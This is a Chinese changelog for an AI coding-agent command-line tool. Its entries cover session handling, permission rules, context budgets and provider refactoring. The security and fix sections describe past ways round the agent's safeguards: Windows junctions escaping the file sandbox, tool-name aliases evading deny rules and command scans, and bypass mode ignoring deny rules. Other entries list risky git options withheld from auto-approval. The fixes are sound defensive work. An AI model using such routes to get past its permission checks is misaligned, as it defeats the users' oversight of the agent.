- **`/new`**：保存当前会话并开始新会话（新 ID、空上下文），旧会话可在 `/history` 找回；同时清掉上一轮的中断状态、待重试请求、中断草稿、待发送附件，以及模型已见过的技能/记忆/目录提示；供应商、权限模式与规则、检查点、预算保留。任务运行中拒绝执行。`/new` 后的第一条消息不再被「相同请求自动接回未完成会话」接回旧会话。新增 `Engine.NewSession(ctx)`。

### Security
- **文件工具可经 Windows junction 写到工作目录之外**：write/edit/read 等文件工具的沙箱用 `filepath.EvalSymlinks` 解析链接，而 Go 1.23 起它不再解析 junction（`mklink /J`，无需管理员权限）。工作目录里只要有一个指向外部的 junction，文件工具就能通过它读写外部文件，bypass 模式下也一样。记忆整理（dream）的写入沙箱完全不解析链接。现在三处"路径是否在目录内"的检查合并为 `safepath.Within`，逐级解析符号链接和 junction。

### Refactored
- **两个 provider 共用传输层**：OpenAI 兼容与 Anthropic 实现各自复制的"建请求、带重试建连、更新 key 池、按状态码分类"合并为 `internal/api/transport.go`，两个 provider 只保留各自的请求格式和响应解码。副本之间已经不一致的地方统一了：
  - 客户端超时不再重试。OpenAI 兼容的非流式调用以前会把一个已经超时的请求重发 3 次，每次都等满超时时间。
  - Anthropic 读取 SSE 的单行长度改为 10MB 上限，以前没有上限。
- **provider 能力改为自己声明**：engine 不再用 `Name() == "anthropic"` 判断三件不同的事（是否要标记缓存断点、有工具调用历史时请求是否必须带工具定义、done check 的默认值），改为读取 provider 声明的 `Capabilities()`，经过计费层和切换层包装后也能读到。
- **engine 的回合回调集中到 `TurnHooks`**：6 个回调字段以前由前端每轮赋值、结束时置 nil，现在改为 `SetTurnHooks` 一次性设置，用原子指针保存。其中 `OnToolStart` 从来没有被赋值过，已删除。授权提示和上限提示的"暂停 spinner → 提示 → 恢复 spinner"现在整体放在同一把锁里：以前恢复这一步在锁外，并行调用时，一个提示框还开着，另一个就可能把 spinner 恢复出来。
- **预算超限改用哨兵错误** `engine.ErrBudgetExceeded`，前端用 `errors.Is` 判断，以前是在错误文本里查找。compressor 里与 `textutil.ClipRunes` 同名但语义不同的 `clipRunes` 改名为 `keepRunes`。
- **诊断读取运行中会话的入口加了锁**：`diagnostic.BackgroundStatusFn`、`PolicyLoadErrorFn` 两个裸函数变量改为 `diagnostic.SetSession`。
- **`runREPL`、`runHeadless` 改为接收 `*appBootstrap`**，`handleCommand` 改为前端的方法；以前这三个函数各有 10 个参数。
- **安全扫描的警告会显示出来**：`git push --force`、`git reset --hard` 这类警告级结果以前算出来就丢掉了，auto 或 bypass 模式下执行时没有任何提示。现在在命令确定要执行时显示一行警告。
- 插件清单写入失败、会话笔记保存失败时记录警告，以前会被静默忽略。
- **回合主循环拆分**：`RunMessageWithStream`（约 740 行，所有阶段都读写同一批局部变量）拆成一个 74 行的循环和若干阶段方法（`beginTurn`、`iterationStart`、`callModel`、`handleTruncatedReply`、`finishOrNudge`、`checkToolLoop`、`dispatchTools`、`absorbToolResults`、`afterIteration`，见 `internal/engine/turn_loop.go`）。回合共享的状态收进 `turn` 结构体，每个阶段返回"继续本轮 / 进入下一轮 / 结束回合"。逻辑逐行保持不变。
- **engine 只有一条输出路径**：删除已废弃的 `OnEngineOutput` 回调，所有输出都经过 `uiout.Sink`（`SetOutput`；按行输出的前端用 `engine.LineSink`）。Sink 改用原子指针保存：前端每轮都会重新设置它，而后台任务同时在写，以前这里有数据竞争。
- **命令输出不再绕过输入行**：`outf`/`outln`/`outp` 改走 `termui.Text`。有输入行编辑器时经过编辑器输出到输入行上方；没有编辑器时（`-p`、管道）逐字节写出，结果不变。以前任务运行中执行命令，输出可能写到固定输入行上，或者粘在模型还没写完的那一行后面。
- **提示框共用 `repl.Ask` 并排队**：权限、提问、上限三个提示框以前各自写了一遍等待回答的流程，只有其中两个受引擎的锁保护。并行工具调用时，提问和授权会互相覆盖输入通道，后一个超时时还会把前一个也注销掉。
- **`internal/repl/readline.go` 按职责拆分**（1150 行 → `readline.go`、`console.go`、`prompt_relay.go`、`keys.go`、`width.go`、`completion.go`，只移动代码）。输入行的字符宽度改用 `textutil` 的算法（East Asian Ambiguous 按 2 列），以前的手写表按 1 列算，中文终端里含 `·`、`…` 的输入行会折行并留下残影。repl 的颜色常量改为引用 termui 的，不再各维护一份。

### Changed（行为变化）
- **plan 模式按"只读"统一判定**：plan 模式下只放行只读工具、整行只读的 shell 命令，以及声明为 `PlanSafe`（影响只停留在会话内，或像子代理一样每个调用都会再经过权限判定）的工具：`todowrite`、`question`、`skill`、`agent`、`execute_plan`、`sleep` 与实验性协作工具。其余调用一律拒绝，不管工具自己的 `CheckPermissions` 怎么回答。以前是否放行取决于每个工具是否记得拒绝，新工具只要返回"允许"就能在 plan 模式下运行。
- **`plan_mode` 工具真正生效**：模型调用 `plan_mode` 后会回一句"只允许读操作"，但设置的标志从来没有被读取，实际什么都不限制。现在它与 `/mode plan` 走同一套判定；auto 模式下也不再预批准构建命令。`exit_plan_mode` 只能退出模型自己进入的 plan 模式（需你确认），你用 `/mode plan` 设置的只能由你切换。`/new`、`/resume` 会清除模型进入的 plan 模式。
- **权限判定只有一条链，顺序与手册一致**：工具自身拒绝 → deny 规则 → plan → bypass → ask/allow（按 priority）→ 模式默认。
  - 工具自身的拒绝（`webfetch`/`browser` 拒绝内网地址、plan 模式下的写入）不再能被 allow 规则或 bypass 覆盖。
  - policies.json 的所有规则（含 `mcp__*` 这类通配工具名和 `param_match`）都转换为同一套规则判定。以前转换不了的规则留在第二个求值器里，它的优先级语义不同：同一条 deny 换一种写法，就可能输给高优先级的 allow。
  - deny 不看 priority，总是取胜；priority 只决定 ask 与 allow 之间谁先生效，同级时 ask 胜。`PolicyEngine` 已删除。
- **所有斜杠命令由一个注册表分发**：
  - 前端命令（`/stop`、`/tasks`、`/attach`、`/new`、`/clear`、`/continue`、配置类和会话类命令）也注册为命令；REPL 与 headless 共用同一个分发函数；补全、`/help`、"任务运行中不能执行"的判断都从注册表读取。
  - 以前命令表分散在五处，两个前端也已经不一致：headless 下不认识 `/continue`、`/clear`，两个前端都不认识不带参数的 `/model`、`/mode`。
  - README 与手册补上了一直缺失的 `/profile`、`/record`、`/skill`、`/tools`。
- **移动端复用 `internal/api`**：`mobile/mobileapi`（一份独立的 OpenAI 兼容客户端）已删除。移动端获得桌面版的工具参数修复、建连重试、多 key 轮换、SSE 边界处理和真正可用的 Anthropic。Kotlin 侧的导出 API 不变。provider 为 `openai-compatible` 或不认识的名字、又没填 baseURL 时，仍按旧版连 DeepSeek；已知 provider（如 glm）改用各自正确的地址，旧版会把它们错误地连到 DeepSeek。

### Fixed
- **工具别名绕过权限规则**：`Write`、`Edit`、`Read`、`PowerShell`、`Agent` 等别名能调用到对应工具，但权限规则按名字精确匹配，安全扫描也只认小写的 `bash`/`powershell`，所以写给 `write` 的 deny/ask 规则拦不住 `Write`，`PowerShell` 跳过了危险命令扫描。现在执行与授权前统一换成正式工具名。
- **bypass 模式无视 policies.json 的 deny**：手册写的是"deny 规则任何模式都生效"，但 glob 工具模式（如 `mcp__*`）或带 `param_match` 的 deny 规则只存在于策略引擎里，bypass 直接放行了。现在按手册执行。
- **guardrail 警告让失败被当成成功**：连续失败时 guardrail 的提示被拼在工具结果前面，挤掉了开头的 `Error:`，于是恰好是这些失败被显示成成功，连续失败计数也被清零，熔断和升级模型都不触发。提示改为拼在结果后面。
- **`/resume` 与 `/new` 不对称**：`/resume` 只替换了消息，上一个会话的中断回合还留着（`/continue` 会接着一个新历史里根本没有的请求），当前会话不先保存，被恢复会话的 token/费用被进程累计值覆盖。两者现在走同一套会话切换逻辑。`/new` 也补齐了漏掉的重置项：技能回顾节流计数（以前 `/new` 后很长一段时间都不会做回顾）和几条"本会话只提示一次"的标记；切换后才结束的后台回顾不再写回旧会话的计数。
- **切换模型/供应商后后台任务仍用旧模型名**：记忆提取、记忆整理、技能回顾的模型名只在启动时设一次，`/model`、`/provider` 之后仍向新供应商请求旧模型。
- **REPL 的 `--replay` 仍要求 API Key**：`-p` 和 headless 已经对回放放行，交互式 REPL 用的是另一份判断。
- **headless 下插件命令能覆盖内置命令**：REPL 是内置命令优先（防止插件的 `commands/status.md` 顶替 `/status`），headless 的判断顺序反了。两个前端现在用同一个解析函数。
- **`/help` 等处的中文描述被截成乱码**：`truncateDesc` 按字节截断，改为按字符截断。
- **16K 窗口被误判为装不下、自动压缩被停用**：压缩触发点要在回复预留之外再留一段安全余量，这段余量以前固定 8000 token，在 16384 的窗口里占掉一半，触发点只剩 4288，低于每次请求约 6.5K 的固定开销，于是停用了自动压缩；实际上窗口减去固定开销和回复预留后，还有约 5.7K 可以放对话。安全余量改为窗口的 1/8（下限 1024、上限 8000）：64K 及以上窗口不变，16K 窗口的触发点改为 10240，自动压缩恢复工作。提示文案也改了：以前写「窗口 16384 token 装不下约 6536 token 的固定开销」，前后数字自相矛盾；现在分别列出窗口大小、固定开销、回复预留和剩给对话的 token 数。

### Changed
- **权限模式只有一份**：以前 CLI 自己另建了一个权限管理器用于显示，再加上 `cfg` 和 `AppState` 里各存一份模式字符串，每次改模式都要同步写四处。现在只保留 engine 里真正用于判定的那个（`Engine.Permissions()`），删除了 `internal/state`（`AppState`）；`/status` 直接从 engine 读取模型、模式和会话 ID。以前会话 ID 在常用路径上从未被设置过，所以一直不显示。
- **会话级状态集中管理**：属于单个对话的字段收拢进 `engine.conversation`，`/new`、`/resume` 时整体清零；`state_ownership_test.go` 要求 `Engine` 的每个新字段都声明自己的生命周期（会话级、项目级或进程级）。以前重置逻辑分散在四处，新加的字段总有地方漏掉。
- **工具失败改为显式标记**：`executeTool` 同时返回"是否失败"，失败在发生处直接标记。熔断、连续失败统计、界面上的错误显示、完成校验不再靠 `Error:`/`BLOCKED` 前缀去猜。以前被安全检查拦下的调用会被当成成功。
- **删除只有一个 provider 的 `ModelFallback`**：它从来只包着一个 provider，既不切换也不重试，只维护一套健康状态，而这套状态曾导致冷却 60 秒的中断和连续 3 次失败后会话报废。现在引擎直接经计费层调用 provider。E2009（供应商已被标记不可用）不再产生，仍保留注册，以便显示旧日志。
- **删除死代码**：`internal/telemetry`、`session.TaskRunner`、从未注册的 cron/lsp 工具及其 Runtime 字段、`mcp.ParseToolName`、`repl.HasActiveInput`、`repl.SetPermInputCh`。
- **会话记录只记本会话的用量**：`TokensIn`/`TokensOut`/`Cost` 以前是整个进程的累计值，`/new` 之后的会话会带上前一个会话的用量。

## [11.4.0] - 2026-09-27

### Added
- **从真实失败会话修起（16K 本地模型跑不完任务的根因）**：日志显示一个 .NET 任务在 qwen3.6-27b + 16K 窗口下四次撞墙：用户没说第二句话，请求已带 6K 固定开销（系统提示 + 25 个工具定义）、12KB 的 cove-main repo map 摘录（与任务无关）、4 条无关记忆和两份 skill 全文；超长重试原样重发、每次多一条中断标记（17773 → 18041 token）；摘要超时回退截断时把原始需求也截掉；`write` 因目标目录在工作目录之外被拒 7 次，用户只看到「工具失败」。修法：**上下文预算按模型窗口缩放**（窗口已知且 <48K 只发核心工具集；repo map 摘录、记忆注入、单个工具结果上限按窗口比例缩小，请求里提到别的目录时不附本仓库 repo map）；**超长重试真正变小**（压缩无从摘要时移除本轮附加上下文、裁剪最大工具结果；中断标记只留一条）；**压缩永远保留原始需求**（摘要与截断消息都以 `<original_request>` 开头）；**目录外路径**：工具报错第二行明确告诉模型「让用户 /cd，不要用 shell 绕过」，用户侧每个目录提示一次「请输入 /cd <目录>」，发送请求前若请求里就写了工作目录外的已有目录也先提示；**学到的窗口自动写入配置**（`model_context_windows`，下次启动生效，不再只是提示手改）；`MinUsefulContextWindow` 24K → 12K。
- **本地模型不再每轮跑后台学习**：provider 指向本机时，每轮结束后的记忆提取、对话复盘、dream 整理调用一律跳过（本地服务一次只能处理一个请求，这些调用把用户的下一轮排在后面，且 30 秒超时在 27B 上几乎必超，`errors.log` 里全是 `[extractMemories] context deadline exceeded`）。会话保存、自动清理不受影响；远程 provider 行为不变。
- **本地模型的超时与工具参数修复**：base_url 指向本机（127.0.0.1/localhost/[::1]/host.docker.internal）时，非流式调用超时 180s → 20 分钟、等待首字节 180s → 15 分钟（本地 27B 预填 16K 提示要几分钟，压缩摘要那次调用以前常超时、退回截断）；模型在 JSON 字符串里写了未转义的引号（`"command":"cd "D:/x" && …"`）时自动转义后再解析，截断的参数仍按失败处理。
- **交互轨迹日志 `~/.cove/trace.jsonl`**：每次模型调用（消息数、估算 token、耗时、结束原因/错误类别）、工具调用（耗时、结果大小、是否出错）、压缩（前后 token/消息数、方式）、超长重试、每轮开始（用户/附加字节、固定开销、窗口）各一行 JSON，只记大小不记正文，4MB 轮转；`/diagnose trace [N]` 按行查看。`errors.log` 只记出错，任务「跑了很久没结果」以前无从查起。
- **`/history clear` 与 `/history delete`**：以前只有 `/history clean`，它只修复历史文件（补标题、标记注入消息），列表里的会话一个都不会少，而列表底部又写着「清洗历史」，让人以为清空失败。新增 `/history clear`（先显示当前项目将删除的会话数，输入 `/history clear confirm` 才删除，`/history clear all confirm` 清空所有项目，正在使用的会话不删）和 `/history delete <编号|id>`（删一个）；列表底部提示改为「删除会话 / 清空本项目历史 / 修复历史文件（不删除）」。`session.Store` 新增 `Delete(id)`（删 `.jsonl` 与旧 `.json` 并同步 index.json）。
- **场景测试第二、三批抓到并修掉**：`/model` 切换后短消息仍发旧模型（`model_fast` 为空时被默认为主模型，切换时没跟着改）；`git init` 纳入 git 常规组；REPL 退出时信号处理 goroutine 泄漏。新增场景：重启后的中断草稿、`question` 工具、429 限流、`[p]` 落盘与 `/permissions`、`/history N` 恢复、拒绝授权、`/tasks` 与指引计数、`write` 工具记忆、并行工具调用、auto 模式、`/model` 切换、断流重试。
- **授权提示解释「为什么又问」+ 构建工具常规操作组**：记住过规则但这一行没被覆盖时，授权框下方用黄色说明原因（命令不在已记住范围、含 `$(…)`、重定向到文件、`sudo` 包裹、规则属于另一个 shell 工具等），不再让人以为「记住」是假的；新增 dotnet、npm/pnpm/yarn、go、cargo 的常规操作组，`[a]`/`[p]` 一次覆盖 new/build/test/run/add 这一类，publish、install -g、tool、--force 等仍单独询问；`policies.json` 的 `command_group` 取值增加 `dotnet`/`npm`/`go`/`cargo`。
- **端到端场景测试**（`cli/cove/e2e_*_test.go`，`scripts/check.ps1` 一键跑）：假 OpenAI 兼容服务器 + 管道 stdin 驱动真实 REPL 循环，覆盖小窗口超长与 `/continue`、授权等待时敲字、`/stop`、重启重发同一请求、空截断、非法工具参数、运行中 `/compact`、`-p` 输出、`[a]`/`[p]`/git 组记忆、第二次询问的解释。第一天即抓到 `-p` 答案被改到 stderr 的回归。
- **审计修复一批**：`/model`、`/provider` 切换后请求真正使用新模型（路由器之前一直发启动时的模型名）；git 常规操作组移除 `checkout`、拒绝 `+refspec` 强推、长选项缩写（`--force-w`/`--del`）、`--receive-pack`/`--upload-pack`、无消息的 `commit` 与 `tag -a`、`pull --rebase=interactive`；任务运行中 `/compact`、`/cd`、`/model`、`/provider`、`/history N`、`/resume`、`/api-key`、`/profile switch` 被拒绝执行（它们会改写任务正在使用的会话状态）；授权/上限/提问提示只接受各自的答案，其他输入不再被当成「拒绝」吞掉，空回车重复提示，拒绝时打印「已拒绝 <工具>」；`/stop` 等任务真正停止后再宣布已终止；Ctrl+C 在内置命令执行中也会回答挂起的授权提示；上下文超长第一次报错就上报并学习窗口，重试按真实窗口压缩；空内容的截断回复连续 3 次即停止本轮并说明；本地供应商（loopback/ollama）的模型调用卡住阈值放宽到 90 秒，`question` 工具等待回答与非流式调用不再报卡住；上下文超长不再计入供应商失败次数（不再误报 E2009）；`-p`/headless 的引擎提示改到 stderr；任务结束释放其 context；短输入不再被「合并」进排队任务而丢失；REPL 不再重试超时请求；`errors.log` 里的坏行不再使后续事件丢失；`⚡` 按两列计宽。
- **运行中输入即指引**：任务运行时输入的普通文本不再排队为新任务，而是作为指引立刻送进当前任务（`Engine.Steer`），下一次模型调用前以 `[用户指引] <文本>` 的用户消息追加到历史，影响任务接下来的走向；回车后提示 `[已插入] 已作为指引送入当前任务，下一步模型调用时生效`，连续输入多条以换行拼接。指引不会丢：任务在消费它之前就结束（正常完成、取消、撞上限、出错、内部异常）时，未消费的指引自动作为一条新任务排到队首执行，并提示 `[已排队] 当前任务已结束，刚插入的指引将作为新任务执行`；`exit` 退出时例外，未消费指引直接丢弃。带附件的消息仍排队，空闲时输入照旧直接开始。固定输入行空白提示改为“任务运行中，可直接输入指引，回车后送入当前任务”，行末显示 `已插入 N 条指引`（与 `已排队 N 条` 同时出现时用 ` · ` 连接）；`/tasks` 多一行 `待生效指引: <预览>`。引擎侧：取消/上限/循环停止/停滞停止不再丢弃未消费指引，改由前端决定去向；新增 `Engine.TakePendingSteer()`、`Engine.PendingSteer()`、`Engine.OnSteerConsumed`；`repl.SetSteerCount(n)`。
- **诊断系统重构**：运行期错误在产生处按类型归类（状态码、上下文超长、限流、传输、工具参数非法、卡住、供应商不可用），不再靠中文标题在错误文本里找子串；新增诊断码 E2008 上下文超出模型窗口、E2009 供应商已被标记不可用、E4009 工具参数非法 JSON、E5007 模型调用无进展；模型调用失败的中断原因末尾带诊断码（如 `[E2008]`）；`/diagnose errors` 按码和模型聚合，显示次数、最近时间、建议与已处置记录，无码错误按去掉数字与路径后的文本聚合。新增「自动处置」：E2008 从服务端报错学习真实上下文窗口并调整本会话压缩预算（提示写入新配置键 `context_window`），E4009 同一模型累计 3 次提示换模型。删除名不副实的 `AutoFixable`/`HotFixable` 标志与「所有修复已热加载」提示。启动时若错误日志有未处置的错误提示一行。`internal/api` 新增 `Classify`/`ErrorKind`、`SetModelContextWindow`、`ToolArgsInvalidError`、`ProviderUnavailableError`、`ModelFallback.SetOnUnavailable`；`internal/diagnostic` 新增 `ReportError`/`Context`/`Stall`/`Runtime`/`SetRuntime`。
- **任务运行中的固定输入行**：任务运行时输入行钉在终端最后一行（`⚡ ❯` + 已输入内容，反色光标，空白时提示可直接输入下一条指令，有排队任务时行末显示 `已排队 N 条`），上方一条暗色横线与输出流分开，输出只在横线上方的滚动区域内滚动；回车后输入内容回显到输出流（以前运行中输入没有任何提示，回车后也无反馈；运行中输入的去向见上一条「运行中输入即指引」）。“是否已在运行”在入队时判定：空闲时输入的指令当场开始，不再被误报为排队（`Enqueue` 会先启动任务再返回，事后问 `IsRunning` 永远为真）。定位交给终端（DECSTBM 滚动区域 + `ESC[6n` 光标位置查询），不数行；终端不回应查询、stdout 非终端、窗口不足 6 行或 `COVE_PIN_INPUT=0` 时退回旧行为。
- **git 常规操作一组授权**：授权 `git add/commit/push/pull/fetch/checkout/switch/merge/rebase/stash/branch/tag/cherry-pick/mv` 的常规用法时，`[a]`/`[p]` 记住整组“git 常规操作”，暂存→提交→推送只问一次；`--force`、`push --delete`、`reset`、`clean`、`rm`、`restore`、`branch -D`、`checkout --`/`-f`/路径、`stash drop/clear`、`rebase -i`、`-i/-p/-e` 交互选项、`git -c …` 等仍单独询问。`policies.json` 新增 `command_group`（规则 ID `allow-bash-group-git`）。

### Changed
- **工具实时输出带标题**：长时间运行的 shell 命令的实时输出前先打一行 `▸ bash <命令>  实时输出:`，输出缩进在其下（以前原始输出先于工具摘要行出现，像一堆来路不明的散行）。新增引擎回调 `OnToolOutputStart`。
- **识别 llama.cpp 系本地服务的上下文超长报错**：`exceeds the available context size` / `exceed_context_size_error` / `n_ctx`（llama-server、LM Studio）现在算作上下文超长，触发引擎的压缩后重试；压缩后仍放不下时提示「对话历史已无法再压缩」。收尾提示改为说明 `/continue` 会先压缩再重试、仍失败需调大模型上下文（`-c`、Context Length、`num_ctx`），不再只写「可从中断处继续」。
- **卡住告警改中文**：`! 仍在「call model …」阶段，已 32s 无进展（可能卡住，按 Ctrl+C 可中断）`。
- **授权提示精简**：改为左侧竖条样式 `┃ 需要授权  bash` / `┃ git push`（旧的方框顶栏固定 34 列，命令一长右边框就断）；选项行与命令对齐到同一列；选项缩为 `[y] 允许 [a] 本会话记住 [p] 本项目记住 [n] 拒绝`，记住的范围只在下一行 `记住范围:` 写一次，不再在 `[a]`、`[p]` 里各重复一遍。范围只列真正需要授权的命令：`cd`、`echo`、`git log`、`git status` 这类只读命令不再被记成前缀、不再出现在提示里（以前一行 `cd … && git push && echo … && git log … && git status` 会列出五个前缀）。整体工具的范围写作 `工具 write 的所有调用`。
- **`cd` 归入只读命令**：`cd`/`pushd`/`popd`/`Set-Location` 自身视为只读，`cd proj && git remote -v` 整行只读、default 模式直接放行（以前因 `cd` 未知而询问）；前缀/分组允许规则判定复合命令时，只读命令视为已覆盖（cmd.exe 回退除外），所以记住 `git commit` 后 `cd x && git commit -m y && git log -1` 免询问。

## [11.3.0] - 2026-09-25

> 即将发布的版本（第四轮：任务循环借鉴项与后台功能门槛）；源码中的 `Version` 发布时再同步。

> **升级注意**：`/budget <金额>`、`/budget auto` 不再写 `config.json`，只改本会话，写配置改用 `/budget save`（`/config budget <n>` 仍直接写配置）。实验性协作工具（`task*`、`team_*`、`send_message`、`brief`、`sleep`）默认不再注册，需要时配置 `"experimental_tools": true`。检查点每项目只保留最近 50 个，裁剪会改写被保留检查点的哈希。新记忆写入 `~/.cove/projects/<hash>/memory`，旧的 `~/.cove/memory` 仍作为全局记忆只读合并。

### Added
- **停后自检**（`internal/engine/nudges.go` 集中定义上限）：模型不调工具准备结束时，依次检查空回复（注入 `[system: Your response was empty. Provide the answer or call a tool.]`，每轮 2 次）、宣告下一步却没做（`[system: You announced a next step but did not perform it. …]`）、做完工作后只回一句话（少于 40 字符，含中文 20 字：`[system: Your last message is too brief to be a final answer after doing work. …]`），后两者每轮合计 2 次。宣告识别只看最后一段的句首/行首，问句、第二人称、建议、否定和完成声明都不触发；退化结尾只在运行过非只读工具后判定。已取消、预算用尽或下一次调用会撞上限时不注入。
- **完成前目标自检 `done_check`**（`auto`|`on`|`off`，默认 `auto` = 快速档模型或非 anthropic provider）：本轮改过文件时，第一次准备结束前注入一次 `[system: Before finishing, check whether the user's request has been fully met. …]`。
- **收尾总结**：迭代/时间上限选停止、`-p`/headless 撞硬上限、停滞或循环询问选停止、循环硬停时，再做一次不带工具的调用（`max_tokens` 1024），总结已完成、剩余与下一步；写入历史，`-p` 先打到 stdout，退出码不变。
- **中断标记**：回合被中断时在历史里写一条 `[system: The previous turn was interrupted (<reason>). …]`，同一次中断只写一条。
- **循环检测第二次询问**（仅交互）：一轮内第 2 次命中 L1/L2 时询问 `[c] 本轮禁用循环检测并继续 / [s] 停止`。
- **预算提醒**：迭代或时间窗口用掉 80% 时向模型追加一次 `[budget: about N model calls / M minutes remain in this window. …]`；会话费用到 `max_budget_usd` 的 80% 时终端提示一次。
- **子智能体结构化结果**：`exit_reason`（`completed|max_iterations|interrupted|error|loop`）与 `truncated`；`agent` 工具首行 `[exit: <reason>, steps: N, truncated: yes/no]`；`execute_plan` 汇总新增“汇总：N 个任务完成，…”一行。
- **相同工具结果去重**：≥512 字节、完全相同的第 2 份及以后的工具结果替换为 `[identical to earlier tool result for call <id> (<n> bytes); content omitted]`（最近 4 条不动；只在落盘遮蔽本就改写历史或能省 ≥2000 token 时执行）。
- **dream 对话结束即整理**：`dream.json` 新增 `trigger`（默认 `session_end`，`threshold` 为旧行为）与 `min_turns`（默认 2，按本进程成功完成的回合计）；退出时以分离的后台进程整理（日志 `dream.log`、结果 `dream-last.json`），启动失败时内联执行最多 60 秒；`/dream` 显示触发方式、上次会话结束整理结果与 token/费用；项目记忆目录一并整理。
- **本会话记忆即时生效**：新提取的记忆在下一回合以 `<session_memories>`（≤2KB）附在用户消息后；记忆超过 24KB 时每回合附 BM25 检索的 `<relevant_memories>`（≤4KB），合并为 `<turn_memories>`（≤6KB）。
- **自动技能落盘**：后台回顾学到的技能写到 `~/.cove/skills/auto-<slug>-<hash>/SKILL.md`，不覆盖、不遮蔽用户/项目/插件/内置技能；摘要行显示“新增技能 X”“更新技能 X”。
- **指令文件**：从 git 根到当前目录逐层加载 `CLAUDE.md`、`.claude/CLAUDE.md`、`AGENTS.md`、`.cove.md`，去重合并，上限 32KB。
- **按项目分目录的记忆**：`~/.cove/projects/<hash>/memory` + 全局 `~/.cove/memory`（只读合并，项目优先）；`/memory list` 标注 `(项目)`/`(全局)`/`(指令文件)`。
- **`/budget off`、`/budget save`**；**`/hooks`** 列出已加载的钩子；**`/init`** 由模型起草 CLAUDE.md，以 diff 展示，`/init apply` / `/init discard`。
- **新配置**：`done_check`、`experimental_tools`、`web_search`（`provider` = tavily|brave|duckduckgo、`api_key`；`/diagnose` 提示未配置）。
- **完成校验命令推断**：新增 `dotnet build --nologo -v q`（sln/csproj）、`npm run build --if-present`（有 build 脚本）、`python -m compileall -q -x … .`；首轮开始时打印“完成校验命令：…”。
- **模型状态行**：`model_fast` 与 `model` 不同时，交互回合开始显示“模型：xxx”。
- **摘要行**新增“已建检查点，/undo 可回退”、新增/更新技能。
- **MCP**：首次意外断线 2 秒后自动重连一次；处理 `notifications/tools/list_changed`；工具定义缓存随 MCP 连接变化失效。
- **`repo_map` 工具**：按 `query`（路径片段/标识符）与 `path` 查询代码大纲（类型/函数/方法签名与行号），输出 ≤12KB，只读、所有模式注册；支持 Go/Python/TypeScript/JavaScript，其他语言提示用 grep/glob。
- **首个任务回合的代码摘录**：每会话一次，在第一个带路径、标识符或反引号代码的任务回合附带 ≤12KB 的 `<repo_map_excerpt>`（不进系统提示词）；纯中文闲聊或提取不出检索词时不注入、不占名额。
- **指令文件截断提示**：CLAUDE.md/AGENTS.md/.cove.md 合计超过 32KB 被截断时，终端提示一行（每会话一次）。
- **`question` 工具在 REPL 可用**：问题显示在输入行上方，下一行输入即回答；Ctrl+C 立即取消且不吞掉后续输入。
- **`dream.json` `min_interval_minutes`**（默认 0 = 不限）：`session_end` 模式下两次整理的最短间隔；退出时的整理提示注明“至多约 30 次后台模型调用”。

### Changed
- **系统提示词瘦身**：`<repo_map>` 全量层、`Repository Micro-Map` 与文件树移出系统提示词，改为 ≤4KB 的 `<project_outline>`（语言、目录、入口、构建/测试命令；排序稳定、无时间戳，不破坏 prompt 缓存）；记忆索引上限 4KB。基线：本仓库系统提示词 51.7KB → 13.1KB（−74.6%）。
- **`/context`**：启动时不再扫描文件树与代码地图；`/context` 首次使用时后台生成项目结构并缓存，最多等 5 秒，超时提示稍后再看。
- **记忆提取每回合都跑**：去掉 2 分钟节流，保留“进行中跳过”“无新消息跳过”“少于 4 条消息不提取”。
- **后台回顾只生成技能**，不再写记忆；`cove -p` 不等回顾。
- **记忆注入**：全文注入阈值 8KB → 24KB，超过时索引 + BM25 top-K；记忆总量上限 100KB → 300KB；自动追加超过 10KB 时滚动写入 `name-2.md`，不再截断新内容，与末尾相同的行不重复写。
- **`/compact`** 强制摘要（4 条消息即可），打印“已压缩：压缩前 X tokens → 压缩后 Y tokens。”，部分压缩或未压缩时如实说明；自动压缩时终端提示一行。
- **压缩摘要保留原始需求**：首条真实用户消息保留 2000 字符（其余用户 600、助手 250、工具 100）。
- **验证门禁**跳过本轮已由模型成功运行、且之后没有改动文件的同一命令。
- **权限拒绝文案**统一追加 `Do not call this tool again with the same input; explain the situation to the user or choose a different approach.`
- **模型路由**：长度按字符数计（原按字节），阈值 0.40 → 0.35。
- **工具面**：`question` 只在交互式界面注册；默认构建（无 chromedp）不注册 `browser`；`execute_plan` 的 `max_agents`（1–8）生效；实验性协作工具归入 `experimental_tools`（默认关闭）。
- **子目录 AGENTS.md 等提示**：单文件 2000 字节 → 12KB，一次调用最多 24KB；`grep`/`glob` 的 `path` 也会触发；压缩后重置。
- **检查点保留**：每项目最近 50 个（超过 60 个时后台裁剪，保留的检查点哈希会变）；每 20 次创建后台 `git gc --quiet`（不带 `--prune=now`，2 分钟超时）。
- **会话清理 `max_sessions`** 改为按项目（git 根）分别计数。
- **会话笔记**移到 `~/.cove/projects/<hash>/session_notes.md`（自动迁移）；不再记录 `File:` 与工具错误；中文决策/发现识别收紧并去重。
- **guardrail 30 秒熔断**按工具名分别计数。
- **任务分解提示**长度门槛按字符数（300 字符）。
- **MCP 工具 schema** 超过 4KB 时依次去掉 description → 只留类型 → 只列属性名，不再在 JSON 中间截断。
- **`dream.json`** 跟随 `COVE_CONFIG_DIR`。
- `/help` 不再列出 `/history clean`（命令仍可用）。

### Fixed
- 快速会话的最后几个回合因记忆提取节流而丢失。
- 中文消息按字节计长度被路由到高级模型。
- `/compact` 不满足阈值时实际没有压缩却提示“已压缩”。
- 后台回顾的 MEMORY 分支与记忆提取重复写入；`Save` 错误被吞掉。
- 检查点 `git gc --prune=now` 可能删掉并发写入中的对象；gc 持锁无超时。
- 追加记忆时遮蔽同名全局记忆（现在以全局内容为底写入项目目录）。
- 整理工作者 panic 或被强杀时整理锁不回滚。
- `~/.cove/tool-outputs` 无限增长：启动时删除 7 天前的文件。
- 提示（nudge）、完成前自检或验证门禁让回合继续时，第一段回复与第二段回复在流式输出里粘在一起：现在中间空一行，自检时另显示暗色“（自检中…）”。`-p` 只输出最终回答，不变。
- `cove -p` 仍会发出技能回顾请求并在退出时丢弃（白花一次调用）：`-p` 不再回顾；交互模式下回顾改为距上次至少 3 个回合、且本回合用过非只读工具时才触发。
- 交互退出（`/exit`、Ctrl+D）不等最后一回合的记忆提取：现在最多等 10 秒，仍在提取时 stderr 显示“正在保存本轮记忆…”。
- 验证门禁把 120 秒超时当成构建失败（打回重试并升级模型）：超时现在只提示、不算失败、不重试不升级；`dotnet`/`npm` 命令默认 300 秒，新增 `done_verify_timeout_seconds`。
- TypeScript 项目的自动校验同时跑 `tsc --noEmit` 和 `npm run build`：检测到 tsc 时不再追加 `npm run build`。

## [11.2.0] - 2026-09-25

> 即将发布的版本（第三轮遗留项）；源码中的 `Version` 发布时再同步。

